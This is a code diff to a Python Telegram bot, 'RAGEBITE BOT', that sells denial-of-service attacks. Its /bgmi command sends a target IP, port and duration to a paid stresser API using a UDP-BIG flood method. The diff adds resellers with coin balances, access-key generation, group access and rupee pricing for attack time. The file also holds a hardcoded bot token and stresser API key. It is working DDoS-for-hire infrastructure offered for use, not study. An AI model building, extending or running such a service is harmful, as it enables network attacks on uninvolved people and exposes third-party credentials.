@@ -21,14 +21,13 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 BOT_TOKEN = '8650600804:AAHtQrUHO7aRhLyFO88qoyg7lUVgf522WdM'
 
 # ============ API CONFIGURATION (COMPLETELY HIDDEN) ============
-# These are hardcoded and NEVER shown to any user - not even admins
 API_BASE_URL = "https://api.godstress.site/api/v1/attack/start"
 API_KEY = "nk_a22fac200f1198e63492f7de86149401"
-API_METHOD = "UDP-BIG"  # Fixed method
+API_METHOD = "UDP-BIG"
 TOTAL_SLOTS = 4
 
-OWNER_ID = "6321758394"  # Only owner has unlimited attacks
-ADMIN_IDS = {"7255464548"}  # Initial admins
+OWNER_ID = "6321758394"
+ADMIN_IDS = {"7255464548"}
 
 USER_FILE = "users.txt"
 LOG_FILE = "log.txt"
@@ -36,19 +35,19 @@ STATE_FILE = "bot_state.json"
 PORT = int(os.environ.get("PORT", "8080"))
 
 # ==================== PRICING ====================
-# Reseller pricing (in coins) - 10 coins per day
 RESELLER_PRICES = {
-    "12hr": {"cost": 5, "display": "12 Hours"},
-    "1day": {"cost": 10, "display": "1 Day"},
-    "1week": {"cost": 70, "display": "1 Week"},
-    "15days": {"cost": 150, "display": "15 Days"},
-    "1month": {"cost": 300, "display": "1 Month"}
+    "1hr": {"cost": 20, "display": "1 Hour"},
+    "1day": {"cost": 150, "display": "1 Day"},
+    "2days": {"cost": 300, "display": "2 Days"},
+    "1week": {"cost": 600, "display": "1 Week"},
+    "15days": {"cost": 750, "display": "15 Days"},
+    "1month": {"cost": 1400, "display": "1 Month"}
 }
 
-# User pricing (in Rs) - For display only
 USER_PRICES = {
-    "12hr": "100 Rs",
+    "1hr": "20 Rs",
     "1day": "150 Rs",
+    "2days": "300 Rs",
     "1week": "600 Rs",
     "15days": "750 Rs",
     "1month": "1400 Rs"
@@ -58,7 +57,9 @@ USER_PRICES = {
 state = {
     "users": {},
     "admins": [],
+    "resellers": [],
     "owners": [OWNER_ID],
+    "groups": [],  # List of group IDs that have access
     "redeem_keys": {},
     "user_attacks": {},
     "attack_history": []
@@ -70,10 +71,12 @@ def load_state():
         with open(STATE_FILE, "r") as f:
             state = json.load(f)
     except:
-        state = {"users": {}, "admins": [], "owners": [OWNER_ID], "redeem_keys": {}, "user_attacks": {}, "attack_history": []}
+        state = {"users": {}, "admins": [], "resellers": [], "owners": [OWNER_ID], "groups": [], "redeem_keys": {}, "user_attacks": {}, "attack_history": []}
     state.setdefault("users", {})
     state.setdefault("admins", [])
+    state.setdefault("resellers", [])
     state.setdefault("owners", [OWNER_ID])
+    state.setdefault("groups", [])
     state.setdefault("redeem_keys", {})
     state.setdefault("user_attacks", {})
     state.setdefault("attack_history", [])
@@ -95,6 +98,16 @@ def is_owner(uid):
 def is_admin(uid):
     return str(uid) in state.get("admins", []) or str(uid) == OWNER_ID
 
+def is_reseller(uid):
+    return str(uid) in state.get("resellers", [])
+
+def is_authorized(uid):
+    return is_admin(uid) or is_reseller(uid) or is_owner(uid)
+
+def is_group_allowed(group_id):
+    """Check if a group has access"""
+    return str(group_id) in state.get("groups", [])
+
 def get_user(uid):
     return state["users"].get(str(uid))
 
@@ -106,7 +119,34 @@ def user_approved(uid):
         return False
     return True
 
-def generate_key(duration, duration_type):
+def get_reseller_balance(uid):
+    user = state["users"].get(str(uid))
+    if user:
+        return user.get("balance", 0)
+    return 0
+
+def set_reseller_balance(uid, amount):
+    uid = str(uid)
+    if uid not in state["users"]:
+        state["users"][uid] = {}
+    state["users"][uid]["balance"] = amount
+    save_state()
+
+def add_reseller_balance(uid, amount):
+    uid = str(uid)
+    current = get_reseller_balance(uid)
+    set_reseller_balance(uid, current + amount)
+    return current + amount
+
+def deduct_reseller_balance(uid, amount):
+    uid = str(uid)
+    current = get_reseller_balance(uid)
+    if current < amount:
+        return False, current
+    set_reseller_balance(uid, current - amount)
+    return True, current - amount
+
+def generate_key(duration, duration_type, generated_by=None):
     """Generate a key with specified duration"""
     key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
     
@@ -121,13 +161,13 @@ def generate_key(duration, duration_type):
         "duration": f"{duration}{duration_type}",
         "expires": expiry,
         "used": False,
-        "used_by": None
+        "used_by": None,
+        "generated_by": str(generated_by) if generated_by else None
     }
     save_state()
     return key
 
 def redeem_key(user_id, key):
-    """Redeem a key for a user"""
     if key not in state["redeem_keys"]:
         return False, "❌ Invalid key"
     
@@ -182,12 +222,7 @@ def log_command(user_id, target, port, time_sec):
 # ==================== API FUNCTIONS (COMPLETELY HIDDEN) ====================
 
 def start_attack(ip, port, duration):
-    """
-    Start attack on API - Uses UDP-BIG method
-    API details are completely hidden - never shown to anyone
-    """
     try:
-        # Build the URL with all parameters
         url = f"{API_BASE_URL}?key={API_KEY}&ip={ip}&port={port}&time={duration}&method={API_METHOD}"
         
         print(f"📤 Sending attack: {ip}:{port} for {duration}s")
@@ -223,10 +258,39 @@ def admin_only(func):
         return func(message)
     return wrapper
 
+def authorized_only(func):
+    def wrapper(message):
+        if not is_authorized(str(message.chat.id)):
+            bot.reply_to(message, "❌ Only Admin/Reseller can use this command.")
+            return
+        return func(message)
+    return wrapper
+
+def check_access(func):
+    """Check if user has access (approved, admin, owner, or in allowed group)"""
+    def wrapper(message):
+        user_id = str(message.chat.id)
+        group_id = str(message.chat.id) if message.chat.type in ['group', 'supergroup'] else None
+        
+        # Check if user is admin/owner/reseller
+        if is_authorized(user_id):
+            return func(message)
+        
+        # Check if user is approved
+        if user_approved(user_id):
+            return func(message)
+        
+        # Check if group is allowed
+        if group_id and is_group_allowed(group_id):
+            return func(message)
+        
+        bot.reply_to(message, "❌ Access Denied!\nUse /redeem <key> to activate.\n\nContact your respective seller to purchase keys.")
+        return
+    return wrapper
+
 # ==================== TIMER FUNCTION ====================
 
 def update_timer(message, chat_id, msg_id, target, port, duration, start_time, is_admin_user, is_owner_user):
-    """Update timer every 5 seconds showing remaining time"""
     try:
         elapsed = 0
         while elapsed < duration:
@@ -308,7 +372,40 @@ def start_health_server():
 def welcome_start(message):
     user_id = str(message.chat.id)
     user_name = message.from_user.first_name
-    is_approved = user_approved(user_id) or is_admin(user_id)
+    is_approved = user_approved(user_id) or is_authorized(user_id)
+    group_id = str(message.chat.id) if message.chat.type in ['group', 'supergroup'] else None
+    is_group_allowed_flag = is_group_allowed(group_id) if group_id else False
+    
+    # Check if user is in an allowed group
+    if is_group_allowed_flag and not is_approved and not is_authorized(user_id):
+        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}!
+
+⚡ The Ultimate Attack Solution
+
+✅ Status: Group Access ✅ (Group ID: {group_id})
+⚔️ Attacks: 1 at a time
+
+💥 Commands:
+/bgmi <ip> <port> <time> - Launch attack
+/status - Check your attack status
+/plan - View pricing plans
+/help - Full guide
+
+📌 RULES:
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Wait for your attack to finish before starting a new one
+
+🔥 Features:
+• Ultimate Power
+• Lightning Fast
+• 24/7 Uptime
+• Premium Quality
+
+💪 Ready to dominate!'''
+        bot.reply_to(message, response)
+        return
     
     if is_owner(user_id):
         response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 👑 OWNER
@@ -316,6 +413,7 @@ def welcome_start(message):
 ⚡ The Ultimate Attack Solution
 
 ✅ Status: Owner Access ✅
+⚔️ Attacks: Unlimited
 
 💥 User Commands:
 /bgmi <ip> <port> <time> - Launch attack
@@ -326,9 +424,19 @@ def welcome_start(message):
 
 👑 Owner Commands (Full Access):
 /ownerpanel - Full control panel
-/alladmins - List all admins
 /addadmin <id> - Add admin
 /removeadmin <id> - Remove admin
+/addreseller <id> <coins> - Add reseller
+/removereseller <id> - Remove reseller
+/addgroup <group_id> - Add group access
+/removegroup <group_id> - Remove group access
+/groups - List allowed groups
+
+📌 RULES:
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Owner = Unlimited attacks
 
 🔥 Features:
 • Ultimate Power
@@ -343,6 +451,7 @@ def welcome_start(message):
 ⚡ The Ultimate Attack Solution
 
 ✅ Status: Admin Access ✅
+⚔️ Attacks: 1 at a time
 
 💥 Commands:
 /bgmi <ip> <port> <time> - Launch attack
@@ -352,18 +461,62 @@ def welcome_start(message):
 /help - Full guide
 
 👑 Admin Commands:
-/generate 12hr/1day/1week/15days/1month - Generate key
-/deletekey <key> - Delete a key
-/keyslist - Show generated keys
+/generate 1hr/1day/2days/1week/15days/1month - Generate key
 /add <user_id> - Add user
 /remove <user_id> - Remove user
 /allusers - List all users
 /activeattacks - See active attacks
 /addadmin <id> - Add admin
 /removeadmin <id> - Remove admin
+/addreseller <id> <coins> - Add reseller
+/removereseller <id> - Remove reseller
+/addgroup <group_id> - Add group access
+/removegroup <group_id> - Remove group access
+/groups - List allowed groups
+/sellers - List all resellers
+/sellerbalance <id> - Check reseller balance
+/addbalance <id> <amount> - Add balance
 
-📌 Note: Admin = 1 attack at a time (same as users)
-📌 Note: Owner cannot be removed
+📌 RULES:
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Admin = 1 attack at a time (same as users)
+• Owner = Unlimited attacks
+
+🔥 Features:
+• Ultimate Power
+• Lightning Fast
+• 24/7 Uptime
+• Premium Quality
+
+💪 Ready to dominate!'''
+    elif is_reseller(user_id):
+        balance = get_reseller_balance(user_id)
+        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 🛒 RESELLER
+
+⚡ The Ultimate Attack Solution
+
+✅ Status: Reseller Access ✅
+💰 Balance: {balance} coins
+
+💥 Commands:
+/bgmi <ip> <port> <time> - Launch attack
+/status - Check your attack status
+/redeem <key> - Activate your access
+/plan - View pricing plans
+/help - Full guide
+
+🛒 Reseller Commands:
+/generate 1hr/1day/2days/1week/15days/1month - Generate key
+/balance - Check your coin balance
+/keyslist - Show your generated keys
+
+📌 RULES:
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Max 300 seconds per attack
 
 🔥 Features:
 • Ultimate Power
@@ -378,6 +531,7 @@ def welcome_start(message):
 ⚡ The Ultimate Attack Solution
 
 ✅ Status: {'Active ✅' if is_approved else 'Inactive ❌'}
+⚔️ Attacks: 1 at a time
 
 💥 Commands:
 /bgmi <ip> <port> <time> - Launch attack
@@ -385,6 +539,12 @@ def welcome_start(message):
 /redeem <key> - Activate your access
 /plan - View pricing plans
 /help - Full guide
+
+📌 RULES:
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Wait for your attack to finish before starting a new one
 
 🔥 Features:
 • Ultimate Power
@@ -416,15 +576,17 @@ def show_help(message):
 
 👑 OWNER COMMANDS (Full Access):
 /ownerpanel - Complete control panel
-/alladmins - List all admins
 /addadmin <id> - Add admin
 /removeadmin <id> - Remove admin
+/addreseller <id> <coins> - Add reseller
+/removereseller <id> - Remove reseller
+/addgroup <group_id> - Add group access
+/removegroup <group_id> - Remove group access
+/groups - List allowed groups
 /stats - Full bot statistics
 
 👑 ADMIN COMMANDS:
-/generate 12hr/1day/1week/15days/1month - Generate key
-/deletekey <key> - Delete a key
-/keyslist - Show generated keys
+/generate 1hr/1day/2days/1week/15days/1month - Generate key
 /add <user_id> - Add user
 /remove <user_id> - Remove user
 /allusers - List all users
@@ -432,13 +594,22 @@ def show_help(message):
 /attackhistory - See attack history
 /addadmin <id> - Add admin
 /removeadmin <id> - Remove admin
+/addreseller <id> <coins> - Add reseller
+/removereseller <id> - Remove reseller
+/addgroup <group_id> - Add group access
+/removegroup <group_id> - Remove group access
+/groups - List allowed groups
+/sellers - List all resellers
+/sellerbalance <id> - Check reseller balance
+/addbalance <id> <amount> - Add balance
 
 📌 RULES:
-• 4 Slots available
-• 1 User = 1 Attack at a time
-• Admin = 1 Attack at a time (same as users)
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Admin = 1 attack at a time (same as users)
 • Owner = Unlimited attacks
-• Admin can add and remove admins
+• Admin can add and remove admins/resellers
 • Owner cannot be removed
 • Max 300 seconds per attack'''
     elif is_admin(user_id):
@@ -457,9 +628,7 @@ def show_help(message):
 /help - This menu
 
 👑 ADMIN COMMANDS:
-/generate 12hr/1day/1week/15days/1month - Generate key
-/deletekey <key> - Delete a key
-/keyslist - Show generated keys
+/generate 1hr/1day/2days/1week/15days/1month - Generate key
 /add <user_id> - Add user
 /remove <user_id> - Remove user
 /allusers - List all users
@@ -467,14 +636,51 @@ def show_help(message):
 /attackhistory - See attack history
 /addadmin <id> - Add admin
 /removeadmin <id> - Remove admin
+/addreseller <id> <coins> - Add reseller
+/removereseller <id> - Remove reseller
+/addgroup <group_id> - Add group access
+/removegroup <group_id> - Remove group access
+/groups - List allowed groups
+/sellers - List all resellers
+/sellerbalance <id> - Check reseller balance
+/addbalance <id> <amount> - Add balance
 
 📌 RULES:
-• 4 Slots available
-• 1 User = 1 Attack at a time
-• Admin = 1 Attack at a time (same as users)
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Admin = 1 attack at a time (same as users)
 • Owner = Unlimited attacks
-• Admin can add and remove admins
+• Admin can add and remove admins/resellers
 • Owner cannot be removed
+• Max 300 seconds per attack'''
+    elif is_reseller(user_id):
+        balance = get_reseller_balance(user_id)
+        help_text = f'''🌟 RAGEBITE BOT - RESELLER HELP
+
+💥 Attack Commands:
+/bgmi <ip> <port> <time> - Launch attack
+
+🔑 Key Commands:
+/redeem <key> - Activate access key
+
+📊 Info Commands:
+/status - Check your attack status
+/plan - View pricing plans
+/id - Your user ID
+/help - This menu
+/balance - Check your coin balance
+
+🛒 RESELLER COMMANDS:
+/generate 1hr/1day/2days/1week/15days/1month - Generate key
+/keyslist - Show your generated keys
+
+💰 Your Balance: {balance} coins
+
+📌 RULES:
+• 4 Attack Slots available
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
 • Max 300 seconds per attack'''
     else:
         help_text = '''🌟 RAGEBITE BOT - HELP
@@ -495,7 +701,7 @@ def show_help(message):
 /help - This menu
 
 📌 RULES:
-• 4 Slots available
+• 4 Attack Slots available
 • 1 User = 1 Attack at a time
 • Different users can attack at same time
 • Max 300 seconds per attack
@@ -510,7 +716,10 @@ def show_user_id(message):
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
-    response = '''🌟 RAGEBITE PLANS:
+    user_id = str(message.chat.id)
+    
+    if is_authorized(user_id):
+        response = '''🌟 RAGEBITE PLANS:
 
 💎 ULTIMATE PLAN:
 → Attack Time: 300 seconds
@@ -518,22 +727,44 @@ def welcome_plan(message):
 → No Waiting Time
 
 💰 PRICES (For Users - Rs):
-• 12 Hours: 100 Rs
+• 1 Hour: 20 Rs
 • 1 Day: 150 Rs
+• 2 Days: 300 Rs
 • 1 Week: 600 Rs
 • 15 Days: 750 Rs
 • 1 Month: 1400 Rs
 
-🔑 Reseller Cost (Coins - 10/day):
-• 12 Hours: 5 coins
-• 1 Day: 10 coins
-• 1 Week: 70 coins
-• 15 Days: 150 coins
-• 1 Month: 300 coins
+🔑 Reseller Cost (Coins):
+• 1 Hour: 20 coins
+• 1 Day: 150 coins
+• 2 Days: 300 coins
+• 1 Week: 600 coins
+• 15 Days: 750 coins
+• 1 Month: 1400 coins
 
 📩 Contact your respective seller to purchase keys
 
 ⚡ DOMINATE WITH RAGEBITE!'''
+    else:
+        response = '''🌟 RAGEBITE PLANS:
+
+💎 ULTIMATE PLAN:
+→ Attack Time: 300 seconds
+→ Priority Support
+→ No Waiting Time
+
+💰 PRICES:
+• 1 Hour: 20 Rs
+• 1 Day: 150 Rs
+• 2 Days: 300 Rs
+• 1 Week: 600 Rs
+• 15 Days: 750 Rs
+• 1 Month: 1400 Rs
+
+📩 Contact your respective seller to purchase keys
+
+⚡ DOMINATE WITH RAGEBITE!'''
+    
     bot.reply_to(message, response)
 
 # ==================== KEY COMMANDS ====================
@@ -552,105 +783,376 @@ def redeem_command(message):
     bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['generate'])
-@admin_only
+@authorized_only
 def generate_key_command(message):
+    user_id = str(message.chat.id)
     command = message.text.split()
+    
     if len(command) != 2:
         bot.reply_to(message, """❌ Usage: /generate <duration>
 
-Available durations (Reseller cost in coins):
-• /generate 12hr - 12 Hours (5 coins)
-• /generate 1day - 1 Day (10 coins)
-• /generate 1week - 1 Week (70 coins)
-• /generate 15days - 15 Days (150 coins)
-• /generate 1month - 1 Month (300 coins)
-
-📌 User pays: 
-• 12 Hours: 100 Rs
-• 1 Day: 150 Rs
-• 1 Week: 600 Rs
-• 15 Days: 750 Rs
-• 1 Month: 1400 Rs""")
+Available durations (Cost in coins):
+• /generate 1hr - 1 Hour (20 coins)
+• /generate 1day - 1 Day (150 coins)
+• /generate 2days - 2 Days (300 coins)
+• /generate 1week - 1 Week (600 coins)
+• /generate 15days - 15 Days (750 coins)
+• /generate 1month - 1 Month (1400 coins)""")
         return
     
     duration_str = command[1].lower()
     
-    # Map duration strings to (duration_value, duration_type)
     duration_map = {
-        '12hr': (12, 'hr'),
+        '1hr': (1, 'hr'),
         '1day': (1, 'day'),
+        '2days': (2, 'day'),
         '1week': (7, 'day'),
         '15days': (15, 'day'),
         '1month': (30, 'day')
     }
     
     if duration_str not in duration_map:
-        bot.reply_to(message, "❌ Invalid duration. Available: 12hr, 1day, 1week, 15days, 1month")
+        bot.reply_to(message, "❌ Invalid duration. Available: 1hr, 1day, 2days, 1week, 15days, 1month")
         return
     
     dur, dur_type = duration_map[duration_str]
-    key = generate_key(dur, dur_type)
     
-    if key:
-        display_name = RESELLER_PRICES.get(duration_str, {}).get('display', duration_str)
+    if is_reseller(user_id) and not is_admin(user_id):
         cost = RESELLER_PRICES.get(duration_str, {}).get('cost', 0)
-        user_price = USER_PRICES.get(duration_str, '0 Rs')
-        bot.reply_to(message, f"""✅ Key Generated!
+        balance = get_reseller_balance(user_id)
+        
+        if balance < cost:
+            bot.reply_to(message, f"""❌ Insufficient Balance!
+
+💰 Your balance: {balance} coins
+🔑 {duration_str} key cost: {cost} coins
+❌ Need {cost - balance} more coins
+
+Contact admin to add balance.""")
+            return
+        
+        success, new_balance = deduct_reseller_balance(user_id, cost)
+        if not success:
+            bot.reply_to(message, f"❌ Insufficient balance! You have {balance} coins.")
+            return
+        
+        key = generate_key(dur, dur_type, user_id)
+        
+        if key:
+            display_name = RESELLER_PRICES.get(duration_str, {}).get('display', duration_str)
+            bot.reply_to(message, f"""✅ Key Generated!
+
+🔑 Key: `{key}`
+⏱ Duration: {display_name}
+💰 Cost: {cost} coins
+📊 Remaining Balance: {new_balance} coins
+
+📌 User can redeem with:
+/redeem {key}""", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, "❌ Failed to generate key.")
+            
+    else:
+        key = generate_key(dur, dur_type, user_id)
+        
+        if key:
+            display_name = RESELLER_PRICES.get(duration_str, {}).get('display', duration_str)
+            cost = RESELLER_PRICES.get(duration_str, {}).get('cost', 0)
+            user_price = USER_PRICES.get(duration_str, '0 Rs')
+            bot.reply_to(message, f"""✅ Key Generated!
 
 🔑 Key: `{key}`
 ⏱ Duration: {display_name}
 💰 Reseller Cost: {cost} coins
 💵 User Price: {user_price}
+👑 Admin/Owner Key (No Cost)
 
 📌 User can redeem with:
 /redeem {key}""", parse_mode='Markdown')
-    else:
-        bot.reply_to(message, "❌ Failed to generate key.")
+        else:
+            bot.reply_to(message, "❌ Failed to generate key.")
 
-@bot.message_handler(commands=['deletekey'])
-@admin_only
-def delete_key_command(message):
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "❌ Usage: /deletekey <key>")
+@bot.message_handler(commands=['balance'])
+def balance_command(message):
+    user_id = str(message.chat.id)
+    
+    if not is_reseller(user_id):
+        bot.reply_to(message, "❌ This command is only for resellers.")
         return
     
-    key = command[1].upper()
-    
-    if key not in state["redeem_keys"]:
-        bot.reply_to(message, "❌ Key not found.")
-        return
-    
-    del state["redeem_keys"][key]
-    save_state()
-    bot.reply_to(message, f"✅ Key `{key}` deleted successfully!", parse_mode='Markdown')
+    balance = get_reseller_balance(user_id)
+    bot.reply_to(message, f"""💰 **Your Balance**
+
+📊 Balance: `{balance}` coins
+
+📌 Key Costs:
+• 1 Hour: 20 coins
+• 1 Day: 150 coins
+• 2 Days: 300 coins
+• 1 Week: 600 coins
+• 15 Days: 750 coins
+• 1 Month: 1400 coins
+
+Use `/generate` to create keys.""", parse_mode='Markdown')
 
 @bot.message_handler(commands=['keyslist'])
-@admin_only
+@authorized_only
 def keyslist_command(message):
+    user_id = str(message.chat.id)
+    
     if not state.get("redeem_keys"):
         bot.reply_to(message, "ℹ️ No keys generated yet.")
         return
     
     response = "🔑 Generated Keys:\n\n"
+    key_count = 0
     for key, data in state["redeem_keys"].items():
+        if is_reseller(user_id) and not is_admin(user_id):
+            if data.get("generated_by") != user_id:
+                continue
+        
+        key_count += 1
         status = "✅ Used" if data.get("used") else "🆓 Available"
         used_by = f" | Used by: {data.get('used_by')}" if data.get("used") else ""
         expiry = datetime.datetime.fromtimestamp(data["expires"]).strftime('%d-%m %H:%M')
         response += f"• `{key}`\n   {status}{used_by} | Expires: {expiry}\n\n"
+    
+    if key_count == 0:
+        bot.reply_to(message, "ℹ️ No keys found.")
+        return
+    
+    bot.reply_to(message, response, parse_mode='Markdown')
+
+# ==================== RESELLER MANAGEMENT COMMANDS ====================
+
+@bot.message_handler(commands=['addreseller'])
+@admin_only
+def add_reseller_command(message):
+    user_id = str(message.chat.id)
+    command = message.text.split()
+    
+    if len(command) != 3:
+        bot.reply_to(message, "❌ Usage: /addreseller <telegram_id> <coins>\nExample: /addreseller 123456789 1000")
+        return
+    
+    try:
+        reseller_id = str(command[1])
+        coins = int(command[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid format. Usage: /addreseller <telegram_id> <coins>")
+        return
+    
+    if coins < 0:
+        bot.reply_to(message, "❌ Coins cannot be negative.")
+        return
+    
+    if is_reseller(reseller_id):
+        bot.reply_to(message, f"ℹ️ User {reseller_id} is already a reseller.")
+        return
+    
+    if reseller_id not in state["users"]:
+        state["users"][reseller_id] = {}
+    
+    state["resellers"].append(reseller_id)
+    set_reseller_balance(reseller_id, coins)
+    save_state()
+    
+    bot.reply_to(message, f"""✅ **Reseller Added Successfully!**
+
+👤 User ID: `{reseller_id}`
+💰 Coins Added: `{coins}`
+👑 Added By: `{user_id}`
+
+📌 Reseller can now generate keys using `/generate`
+📌 Check balance: `/balance`""", parse_mode='Markdown')
+    
+    try:
+        bot.send_message(
+            reseller_id,
+            f"""🎉 **You have been added as a Reseller!**
+
+💰 Starting Balance: `{coins}` coins
+📌 Generate keys: `/generate`
+📊 Check balance: `/balance`
+
+Key Costs:
+• 1 Hour: 20 coins
+• 1 Day: 150 coins
+• 2 Days: 300 coins
+• 1 Week: 600 coins
+• 15 Days: 750 coins
+• 1 Month: 1400 coins""",
+            parse_mode='Markdown'
+        )
+    except:
+        pass
+
+@bot.message_handler(commands=['removereseller'])
+@admin_only
+def remove_reseller_command(message):
+    user_id = str(message.chat.id)
+    command = message.text.split()
+    
+    if len(command) != 2:
+        bot.reply_to(message, "❌ Usage: /removereseller <telegram_id>\nExample: /removereseller 123456789")
+        return
+    
+    reseller_id = command[1]
+    
+    if not is_reseller(reseller_id):
+        bot.reply_to(message, f"❌ User {reseller_id} is not a reseller.")
+        return
+    
+    state["resellers"].remove(reseller_id)
+    save_state()
+    
+    bot.reply_to(message, f"✅ **Reseller Removed!**\n\n👤 User ID: `{reseller_id}`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['sellers'])
+@admin_only
+def list_sellers_command(message):
+    resellers = state.get("resellers", [])
+    
+    if not resellers:
+        bot.reply_to(message, "ℹ️ No resellers added yet.")
+        return
+    
+    response = "🛒 **Reseller List:**\n\n"
+    for reseller_id in resellers:
+        balance = get_reseller_balance(reseller_id)
+        try:
+            user_info = bot.get_chat(int(reseller_id))
+            username = f"@{user_info.username}" if user_info.username else reseller_id
+            response += f"• {username} (ID: `{reseller_id}`)\n   💰 Balance: {balance} coins\n\n"
+        except:
+            response += f"• ID: `{reseller_id}`\n   💰 Balance: {balance} coins\n\n"
+    
+    bot.reply_to(message, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['sellerbalance'])
+@admin_only
+def seller_balance_command(message):
+    command = message.text.split()
+    
+    if len(command) != 2:
+        bot.reply_to(message, "❌ Usage: /sellerbalance <telegram_id>\nExample: /sellerbalance 123456789")
+        return
+    
+    reseller_id = command[1]
+    
+    if not is_reseller(reseller_id):
+        bot.reply_to(message, f"❌ User {reseller_id} is not a reseller.")
+        return
+    
+    balance = get_reseller_balance(reseller_id)
+    bot.reply_to(message, f"💰 **Reseller Balance**\n\n👤 ID: `{reseller_id}`\n💰 Balance: `{balance}` coins", parse_mode='Markdown')
+
+@bot.message_handler(commands=['addbalance'])
+@admin_only
+def add_balance_command(message):
+    command = message.text.split()
+    
+    if len(command) != 3:
+        bot.reply_to(message, "❌ Usage: /addbalance <telegram_id> <amount>\nExample: /addbalance 123456789 500")
+        return
+    
+    try:
+        reseller_id = str(command[1])
+        amount = int(command[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid format. Usage: /addbalance <telegram_id> <amount>")
+        return
+    
+    if amount <= 0:
+        bot.reply_to(message, "❌ Amount must be positive.")
+        return
+    
+    if not is_reseller(reseller_id):
+        bot.reply_to(message, f"❌ User {reseller_id} is not a reseller.")
+        return
+    
+    new_balance = add_reseller_balance(reseller_id, amount)
+    bot.reply_to(message, f"✅ **Balance Added!**\n\n👤 ID: `{reseller_id}`\n💰 Added: `{amount}` coins\n📊 New Balance: `{new_balance}` coins", parse_mode='Markdown')
+
+# ==================== GROUP MANAGEMENT COMMANDS ====================
+
+@bot.message_handler(commands=['addgroup'])
+@admin_only
+def add_group_command(message):
+    """Add a group ID for access - Admin/Owner only"""
+    user_id = str(message.chat.id)
+    command = message.text.split()
+    
+    if len(command) != 2:
+        bot.reply_to(message, "❌ Usage: /addgroup <group_id>\nExample: /addgroup -1001234567890")
+        return
+    
+    group_id = command[1]
+    
+    if is_group_allowed(group_id):
+        bot.reply_to(message, f"ℹ️ Group {group_id} is already allowed.")
+        return
+    
+    state["groups"].append(group_id)
+    save_state()
+    
+    bot.reply_to(message, f"""✅ **Group Added Successfully!**
+
+📌 Group ID: `{group_id}`
+👑 Added By: `{user_id}`
+
+📌 All members of this group can now use the bot!
+📌 They don't need individual keys.""", parse_mode='Markdown')
+
+@bot.message_handler(commands=['removegroup'])
+@admin_only
+def remove_group_command(message):
+    """Remove a group ID - Admin/Owner only"""
+    user_id = str(message.chat.id)
+    command = message.text.split()
+    
+    if len(command) != 2:
+        bot.reply_to(message, "❌ Usage: /removegroup <group_id>\nExample: /removegroup -1001234567890")
+        return
+    
+    group_id = command[1]
+    
+    if not is_group_allowed(group_id):
+        bot.reply_to(message, f"❌ Group {group_id} is not in the allowed list.")
+        return
+    
+    state["groups"].remove(group_id)
+    save_state()
+    
+    bot.reply_to(message, f"✅ **Group Removed!**\n\n📌 Group ID: `{group_id}`\n👑 Removed By: `{user_id}`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['groups'])
+@admin_only
+def list_groups_command(message):
+    """List all allowed groups - Admin/Owner only"""
+    groups = state.get("groups", [])
+    
+    if not groups:
+        bot.reply_to(message, "ℹ️ No groups added yet.")
+        return
+    
+    response = "📌 **Allowed Groups List:**\n\n"
+    for group_id in groups:
+        try:
+            chat = bot.get_chat(int(group_id))
+            title = chat.title if chat.title else group_id
+            response += f"• {title}\n   ID: `{group_id}`\n\n"
+        except:
+            response += f"• ID: `{group_id}`\n\n"
     
     bot.reply_to(message, response, parse_mode='Markdown')
 
 # ==================== 🔥 BGMI COMMAND ====================
 
 @bot.message_handler(commands=['bgmi'])
+@check_access
 def handle_bgmi(message):
     user_id = str(message.chat.id)
-    
-    # Check authorization
-    if not user_approved(user_id) and not is_admin(user_id) and not is_owner(user_id):
-        bot.reply_to(message, "❌ Access Denied!\nUse /redeem <key> to activate.\n\nContact your respective seller to purchase keys.")
-        return
     
     # Parse command
     command = message.text.split()
@@ -683,9 +1185,6 @@ def handle_bgmi(message):
         return
     
     # ========== CHECK USER/ADMIN ATTACK LIMIT ==========
-    # Owner = Unlimited attacks
-    # Admin = 1 attack at a time (same as users)
-    
     if not is_owner(user_id):
         if user_id in state["user_attacks"]:
             attack_data = state["user_attacks"][user_id]
@@ -698,7 +1197,10 @@ def handle_bgmi(message):
 🎯 Target: {attack_data['ip']}:{attack_data['port']}
 
 ⚠️ Wait for current attack to finish!
-Only 1 attack at a time per person.""")
+Only 1 attack at a time per person.
+
+✅ Other users can still attack simultaneously.
+📌 4 Total Slots available.""")
                 return
             else:
                 del state["user_attacks"][user_id]
@@ -707,12 +1209,10 @@ Only 1 attack at a time per person.""")
     # ========== START ATTACK ==========
     log_command(user_id, target, port, duration)
     
-    # Send initial message
     msg = bot.reply_to(message, "⚡ Initiating Ultimate Attack...")
     chat_id = message.chat.id
     msg_id = msg.message_id
     
-    # Call the API (details hidden)
     result = start_attack(target, port, duration)
     
     print(f"🔍 Attack Result for {user_id}: {result}")
@@ -743,6 +1243,7 @@ Only 1 attack at a time per person.""")
     }
     
     state["user_attacks"][user_id] = attack_data
+    save_state()
     
     # ========== STORE IN ATTACK HISTORY ==========
     state["attack_history"].append({
@@ -767,6 +1268,8 @@ Only 1 attack at a time per person.""")
     is_admin_user = is_admin(user_id)
     is_owner_user = is_owner(user_id)
     
+    active_attacks = len([a for a in state["user_attacks"].values() if a["expires"] > now()])
+    
     if is_owner_user:
         admin_tag = " 👑 OWNER"
